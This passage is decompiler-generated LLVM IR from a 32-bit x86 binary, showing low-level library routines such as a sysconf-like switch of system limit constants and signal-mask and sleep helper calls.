  %v2_8053e69 = load i32, i32* %v1_8053e69, align 4
  store i32 %v2_8053e69, i32* @esi, align 4
  store i32 %v2_8053dec, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053e78 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053e78 = call i32 @function_805244d(i32 2, %_TYPEDEF_sigset_t* %v3_8053e78, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053e83 = load i32, i32* @esi, align 4
  %v1_8053e83 = load i32, i32* @ebx, align 4
  %v2_8053e83 = inttoptr i32 %v1_8053e83 to i32*
  store i32 %v0_8053e83, i32* %v2_8053e83, align 4
  %v0_8053f18.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f0e

dec_label_pc_8053e8a:                             ; preds = %dec_label_pc_8053e4c
  %v3_8053e8a = load i32, i32* %stack_var_-420, align 4
  %v12_8053e8a = icmp eq i32 %v3_8053e8a, 1
  %v2_8053e96 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053e96, i32* @ebx, align 4
  %v1_8053e9d = icmp eq i1 %v12_8053e8a, false
  br i1 %v1_8053e9d, label %dec_label_pc_8053ec4, label %dec_label_pc_8053e9f

dec_label_pc_8053e9f:                             ; preds = %dec_label_pc_8053e8a
  %v0_8053e9f = load i32, i32* @edi, align 4
  store i32 %v2_8053e96, i32* %stack_var_-460, align 4
  %v4_8053ea3 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053ea3 = call i32 @function_8054837(%timespec* %v4_8053ea3, i32 %v2_8053e96, i32 %v0_8053e9f, i32 %v0_8053e9f)
  store i32 %v5_8053ea3, i32* %eax.global-to-local, align 4
  store i32 %v5_8053ea3, i32* @edi, align 4
  %v1_8053eaa = call i32 @function_8052719(i32 %v2_8053e96)
  store i32 %v1_8053eaa, i32* %eax.global-to-local, align 4
  store i32 %v1_8053eaa, i32* @ebx, align 4
  %v1_8053eb4 = inttoptr i32 %v1_8053eaa to i32*
  %v2_8053eb4 = load i32, i32* %v1_8053eb4, align 4
  store i32 %v2_8053eb4, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053ebb = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053ebb = call i32 @function_805244d(i32 2, %_TYPEDEF_sigset_t* %v3_8053ebb, i32 0)
  store i32 %v4_8053ebb, i32* %eax.global-to-local, align 4
  %v0_8053ec0 = load i32, i32* @esi, align 4
  %v1_8053ec0 = load i32, i32* @ebx, align 4
  %v2_8053ec0 = inttoptr i32 %v1_8053ec0 to i32*
  store i32 %v0_8053ec0, i32* %v2_8053ec0, align 4
  %v0_8053eea.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053ee7

dec_label_pc_8053ec4:                             ; preds = %dec_label_pc_8053e8a
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053eca = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053eca = call i32 @function_805244d(i32 2, %_TYPEDEF_sigset_t* %v3_8053eca, i32 0)
  store i32 %v4_8053eca, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053ee0

dec_label_pc_8053ed5:                             ; preds = %dec_label_pc_8053e07
  %v2_8053ed7 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053ed7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee0

dec_label_pc_8053ee0:                             ; preds = %dec_label_pc_8053ec4, %dec_label_pc_8053ed5
  %storemerge3.pre-phi = phi i32 [ %v2_8053e96, %dec_label_pc_8053ec4 ], [ %v2_8053ed7, %dec_label_pc_8053ed5 ]
  %v3_8053ee0 = phi i32 [ %v2_8053dec, %dec_label_pc_8053ec4 ], [ %v4_8053e0c, %dec_label_pc_8053ed5 ]
  %v2_8053ee0 = phi i32 [ 0, %dec_label_pc_8053ec4 ], [ %v4_8053e0c, %dec_label_pc_8053ed5 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053ee0 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053ee0 = call i32 @function_8054837(%timespec* %v4_8053ee0, i32 %storemerge3.pre-phi, i32 %v2_8053ee0, i32 %v3_8053ee0)
  store i32 %v5_8053ee0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053ee7

dec_label_pc_8053ee7:                             ; preds = %dec_label_pc_8053e9f, %dec_label_pc_8053ee0
  %v0_8053eea = phi i32 [ %v0_8053eea.pre, %dec_label_pc_8053e9f ], [ %v5_8053ee0, %dec_label_pc_8053ee0 ]
  %v1_8053eea = icmp eq i32 %v0_8053eea, 0
  br i1 %v1_8053eea, label %dec_label_pc_8053f07, label %dec_label_pc_8053eee

dec_label_pc_8053eee:                             ; preds = %dec_label_pc_8053ee7
  %v4_8053efe = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053efe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f0e

dec_label_pc_8053f07:                             ; preds = %dec_label_pc_8053d90, %dec_label_pc_8053ee7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f0e

dec_label_pc_8053f0b:                             ; preds = %dec_label_pc_8053e30, %dec_label_pc_8053deb, %dec_label_pc_8053dbd
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f0e

dec_label_pc_8053f0e:                             ; preds = %dec_label_pc_8053f07, %dec_label_pc_8053eee, %dec_label_pc_8053e62, %dec_label_pc_8053f0b
  %v0_8053f18 = phi i32 [ 0, %dec_label_pc_8053f07 ], [ %v4_8053efe, %dec_label_pc_8053eee ], [ %v0_8053f18.pre, %dec_label_pc_8053e62 ], [ -1, %dec_label_pc_8053f0b ]
  store i32 %v0_8053d93, i32* @ebx, align 4
  store i32 %v0_8053d92, i32* @esi, align 4
  store i32 %v0_8053d91, i32* @edi, align 4
  store i32 %v0_8053d90, i32* @ebp, align 4
  ret i32 %v0_8053f18

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053eaa, { 1, 0, 2 }
  uselistorder i32 %v2_8053e96, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053e2d, { 2, 1, 0 }
  uselistorder i32 %v4_8053e0c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8053dec, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8053dd3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053dba, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 6, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 0, 1, 23 }
  uselistorder i32 (i32, i32*, i32)* @function_80542df, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8052b2e, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053f0e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053f07, { 1, 0 }
  uselistorder label %dec_label_pc_8053ee7, { 1, 0 }
  uselistorder label %dec_label_pc_8053ee0, { 1, 0 }
  uselistorder label %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge, { 1, 0 }
}

define i32 @function_8053f19(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053f19:
  switch i32 %arg1, label %dec_label_pc_8053f38 [
    i32 0, label %dec_label_pc_8053f48
    i32 1, label %dec_label_pc_805402d
    i32 2, label %dec_label_pc_8053f52
    i32 3, label %dec_label_pc_8053f5c
    i32 4, label %dec_label_pc_8053f66
    i32 5, label %dec_label_pc_8053ffc
    i32 6, label %dec_label_pc_8053f6e
    i32 7, label %dec_label_pc_8053f2e
    i32 8, label %dec_label_pc_8053f2e
    i32 9, label %dec_label_pc_8053f2e
    i32 10, label %dec_label_pc_8053f2e
    i32 11, label %dec_label_pc_8053f2e
    i32 12, label %dec_label_pc_8053f2e
    i32 13, label %dec_label_pc_8053f2e
    i32 14, label %dec_label_pc_8053f2e
    i32 15, label %dec_label_pc_8053f2e
    i32 16, label %dec_label_pc_8053f2e
    i32 17, label %dec_label_pc_8053f2e
    i32 18, label %dec_label_pc_8053f2e
    i32 19, label %dec_label_pc_8053f2e
    i32 20, label %dec_label_pc_8053f2e
    i32 21, label %dec_label_pc_8053f2e
    i32 22, label %dec_label_pc_8053f2e
    i32 23, label %dec_label_pc_805402d
    i32 24, label %dec_label_pc_805402d
    i32 25, label %dec_label_pc_8054039
    i32 26, label %dec_label_pc_805400a
    i32 27, label %dec_label_pc_805402d
    i32 28, label %dec_label_pc_8053f80
    i32 29, label %dec_label_pc_8054003
    i32 30, label %dec_label_pc_8053f78
    i32 31, label %dec_label_pc_8054018
    i32 32, label %dec_label_pc_805402d
    i32 33, label %dec_label_pc_805402d
    i32 34, label %dec_label_pc_805402d
    i32 35, label %dec_label_pc_8054011
    i32 36, label %dec_label_pc_8054040
    i32 37, label %dec_label_pc_8054047
    i32 38, label %dec_label_pc_8054040
    i32 39, label %dec_label_pc_8053f8a
    i32 40, label %dec_label_pc_805404e
    i32 41, label %dec_label_pc_805402d
    i32 42, label %dec_label_pc_8054018
    i32 43, label %dec_label_pc_8054047
    i32 44, label %dec_label_pc_8054055
    i32 45, label %dec_label_pc_8054047
    i32 46, label %dec_label_pc_8054003
    i32 47, label %dec_label_pc_8054003
    i32 48, label %dec_label_pc_8054003
    i32 49, label %dec_label_pc_805402d
    i32 50, label %dec_label_pc_805402d
    i32 51, label %dec_label_pc_8054003
    i32 52, label %dec_label_pc_8054003
    i32 53, label %dec_label_pc_805402d
    i32 54, label %dec_label_pc_805402d
    i32 55, label %dec_label_pc_805402d
    i32 56, label %dec_label_pc_805402d
    i32 57, label %dec_label_pc_805402d
    i32 58, label %dec_label_pc_805402d
    i32 59, label %dec_label_pc_805402d
    i32 60, label %dec_label_pc_805402d
    i32 61, label %dec_label_pc_805402d
    i32 62, label %dec_label_pc_805402d
    i32 63, label %dec_label_pc_805402d
    i32 64, label %dec_label_pc_805402d
    i32 65, label %dec_label_pc_805402d
    i32 66, label %dec_label_pc_805402d
    i32 67, label %dec_label_pc_8053f2e
    i32 68, label %dec_label_pc_8053f2e
    i32 69, label %dec_label_pc_8054011
    i32 70, label %dec_label_pc_8054011
    i32 71, label %dec_label_pc_8054011
    i32 72, label %dec_label_pc_8054018
    i32 73, label %dec_label_pc_805401f
    i32 74, label %dec_label_pc_8054026
    i32 75, label %dec_label_pc_8053f94
    i32 76, label %dec_label_pc_8054026
    i32 77, label %dec_label_pc_8053f2e
    i32 78, label %dec_label_pc_8053f2e
    i32 79, label %dec_label_pc_8053f2e
    i32 80, label %dec_label_pc_8053f2e
    i32 81, label %dec_label_pc_8053f2e
    i32 82, label %dec_label_pc_8053f2e
    i32 83, label %dec_label_pc_8053f2e
    i32 84, label %dec_label_pc_8053f2e
    i32 85, label %dec_label_pc_805402d
    i32 86, label %dec_label_pc_805402d
    i32 87, label %dec_label_pc_805400a
    i32 88, label %dec_label_pc_8053f9e
    i32 89, label %dec_label_pc_8053fa8
    i32 90, label %dec_label_pc_805401f
    i32 91, label %dec_label_pc_8053f2e
    i32 92, label %dec_label_pc_8053f2e
    i32 93, label %dec_label_pc_8053f2e
    i32 94, label %dec_label_pc_8053f2e
    i32 95, label %dec_label_pc_8054003
    i32 96, label %dec_label_pc_805402d
    i32 97, label %dec_label_pc_805402d
    i32 98, label %dec_label_pc_8053f2e
    i32 99, label %dec_label_pc_8053f2e
    i32 100, label %dec_label_pc_8053f2e
    i32 101, label %dec_label_pc_8053fb2
    i32 102, label %dec_label_pc_8053ff5
    i32 103, label %dec_label_pc_8054032
    i32 104, label %dec_label_pc_805400a
    i32 105, label %dec_label_pc_8053fbc
    i32 106, label %dec_label_pc_8054018
    i32 107, label %dec_label_pc_8054018
    i32 108, label %dec_label_pc_8053ffc
    i32 109, label %dec_label_pc_8054039
    i32 110, label %dec_label_pc_8054055
    i32 111, label %dec_label_pc_8053ff5
    i32 112, label %dec_label_pc_8054032
    i32 113, label %dec_label_pc_8054055
    i32 114, label %dec_label_pc_8053fc6
    i32 115, label %dec_label_pc_805404e
    i32 116, label %dec_label_pc_805402d
    i32 117, label %dec_label_pc_805402d
    i32 118, label %dec_label_pc_8053fd0
    i32 119, label %dec_label_pc_8053fda
    i32 120, label %dec_label_pc_8054047
    i32 121, label %dec_label_pc_805400a
    i32 122, label %dec_label_pc_805400a
    i32 123, label %dec_label_pc_805400a
    i32 124, label %dec_label_pc_805400a
    i32 125, label %dec_label_pc_8053f2e
    i32 126, label %dec_label_pc_8053f2e
    i32 127, label %dec_label_pc_805402d
    i32 128, label %dec_label_pc_805402d
    i32 129, label %dec_label_pc_8053f2e
    i32 130, label %dec_label_pc_8053f2e
    i32 131, label %dec_label_pc_805402d
    i32 149, label %dec_label_pc_8053fe1
  ]

dec_label_pc_8053f2e:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f38:                             ; preds = %dec_label_pc_8053f19
  %v1_8053f38 = call i32 @function_8052719(i32 ptrtoint (i32* @0 to i32))
  %v1_8053f3d = inttoptr i32 %v1_8053f38 to i32*
  store i32 22, i32* %v1_8053f3d, align 4
  br label %dec_label_pc_805402d

dec_label_pc_8053f48:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f52:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f5c:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f66:                             ; preds = %dec_label_pc_8053f19
  %v0_8053f69 = call i32 @function_8054665()
  br label %dec_label_pc_8053f6e

dec_label_pc_8053f6e:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f66
  br label %dec_label_pc_805405a

dec_label_pc_8053f78:                             ; preds = %dec_label_pc_8053f19
  %v0_8053f7b = call i32 @function_80546fc()
  br label %dec_label_pc_8053f80

dec_label_pc_8053f80:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f78
  br label %dec_label_pc_805405a

dec_label_pc_8053f8a:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f94:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053f9e:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fa8:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fb2:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fbc:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fc6:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fd0:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fda:                             ; preds = %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053fe1:                             ; preds = %dec_label_pc_8053f19
  %v5_8053fe7 = call i32 @function_8054468(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8053fef = icmp slt i32 %v5_8053fe7, 0
  %v1_8053ff1 = icmp eq i1 %v2_8053fef, false
  br i1 %v1_8053ff1, label %dec_label_pc_8054003, label %dec_label_pc_805402d

dec_label_pc_8053ff5:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8053ffc:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054003:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053fe1
  br label %dec_label_pc_805405a

dec_label_pc_805400a:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054011:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054018:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_805401f:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054026:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_805402d:                             ; preds = %dec_label_pc_8053fe1, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f38
  br label %dec_label_pc_805405a

dec_label_pc_8054032:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054039:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054040:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054047:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_805404e:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_8054055:                             ; preds = %dec_label_pc_8053f19, %dec_label_pc_8053f19, %dec_label_pc_8053f19
  br label %dec_label_pc_805405a

dec_label_pc_805405a:                             ; preds = %dec_label_pc_805404e, %dec_label_pc_8054047, %dec_label_pc_8054040, %dec_label_pc_8054039, %dec_label_pc_8054032, %dec_label_pc_8054026, %dec_label_pc_805401f, %dec_label_pc_8054018, %dec_label_pc_8054011, %dec_label_pc_805400a, %dec_label_pc_8053ffc, %dec_label_pc_8053ff5, %dec_label_pc_8054003, %dec_label_pc_8053fda, %dec_label_pc_8053fd0, %dec_label_pc_8053fc6, %dec_label_pc_8053fbc, %dec_label_pc_8053fb2, %dec_label_pc_8053fa8, %dec_label_pc_8053f9e, %dec_label_pc_8053f94, %dec_label_pc_8053f8a, %dec_label_pc_8053f80, %dec_label_pc_8053f6e, %dec_label_pc_8053f5c, %dec_label_pc_8053f52, %dec_label_pc_8053f48, %dec_label_pc_8053f2e, %dec_label_pc_805402d, %dec_label_pc_8054055
  %v0_805405d = phi i32 [ 255, %dec_label_pc_805404e ], [ 2048, %dec_label_pc_8054047 ], [ 99, %dec_label_pc_8054040 ], [ 20, %dec_label_pc_8054039 ], [ -128, %dec_label_pc_8054032 ], [ 1024, %dec_label_pc_8054026 ], [ 4, %dec_label_pc_805401f ], [ 32, %dec_label_pc_8054018 ], [ 256, %dec_label_pc_8054011 ], [ 2147483647, %dec_label_pc_805400a ], [ 16, %dec_label_pc_8053ffc ], [ 127, %dec_label_pc_8053ff5 ], [ 200112, %dec_label_pc_8054003 ], [ 9, %dec_label_pc_8053fda ], [ 65535, %dec_label_pc_8053fd0 ], [ -32768, %dec_label_pc_8053fc6 ], [ -2147483648, %dec_label_pc_8053fbc ], [ 8, %dec_label_pc_8053fb2 ], [ 500, %dec_label_pc_8053fa8 ], [ 4096, %dec_label_pc_8053f9e ], [ 16384, %dec_label_pc_8053f94 ], [ 1000, %dec_label_pc_8053f8a ], [ 32768, %dec_label_pc_8053f80 ], [ 6, %dec_label_pc_8053f6e ], [ 65536, %dec_label_pc_8053f5c ], [ 100, %dec_label_pc_8053f52 ], [ 131072, %dec_label_pc_8053f48 ], [ 1, %dec_label_pc_8053f2e ], [ -1, %dec_label_pc_805402d ], [ 32767, %dec_label_pc_8054055 ]
  ret i32 %v0_805405d

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 2, 3, 5, 6, 7, 8, 4, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 3, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_805405a, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805402d, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8054003, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053f80, { 1, 0 }
  uselistorder label %dec_label_pc_8053f6e, { 1, 0 }
}

define i32 @function_805405e() local_unnamed_addr {
dec_label_pc_805405e:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805405e = load i32, i32* @ebx, align 4
  store i32 %v0_805405e, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 0), label %dec_label_pc_8054072, label %dec_label_pc_805407f

dec_label_pc_8054072:                             ; preds = %dec_label_pc_805405e, %dec_label_pc_8054072
  %v1_80540798 = phi i32 [ %v1_8054079, %dec_label_pc_8054072 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80567c4.234 to i32), i32 -134571972), i32 2), i32 -1), %dec_label_pc_805405e ]
  store i32 ptrtoint (i32* @global_var_8054079.235 to i32), i32* %stack_var_-16, align 4
  %v5_8054072 = mul i32 %v1_80540798, 4
  %v6_8054072 = add i32 %v5_8054072, ptrtoint (i32* @global_var_80567c4.234 to i32)
  %v7_8054072 = inttoptr i32 %v6_8054072 to i32*
  %v8_8054072 = load i32, i32* %v7_8054072, align 4
  call void @__pseudo_call(i32 %v8_8054072)
  %v0_8054079.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054079 = add i32 %v0_8054079.pre, -1
  store i32 %v1_8054079, i32* %ebx.global-to-local, align 4
  %v10_805407a = icmp eq i32 %v0_8054079.pre, 0
  %v1_805407d = icmp eq i1 %v10_805407a, false
  br i1 %v1_805407d, label %dec_label_pc_8054072, label %dec_label_pc_805407f

dec_label_pc_805407f:                             ; preds = %dec_label_pc_8054072, %dec_label_pc_805405e
  %v0_805407f = load i32, i32* @global_var_8056928.236, align 8
  %v1_8054084 = icmp eq i32 %v0_805407f, 0
  br i1 %v1_8054084, label %dec_label_pc_805408a, label %dec_label_pc_8054088

dec_label_pc_8054088:                             ; preds = %dec_label_pc_805407f
  %v0_8054088 = load i32, i32* %stack_var_-16, align 4
  %v1_8054088 = call i32 @unknown_0(i32 %v0_8054088)
  br label %dec_label_pc_805408a

dec_label_pc_805408a:                             ; preds = %dec_label_pc_8054088, %dec_label_pc_805407f
  %v0_805408a = load i32, i32* @global_var_805692c.237, align 4
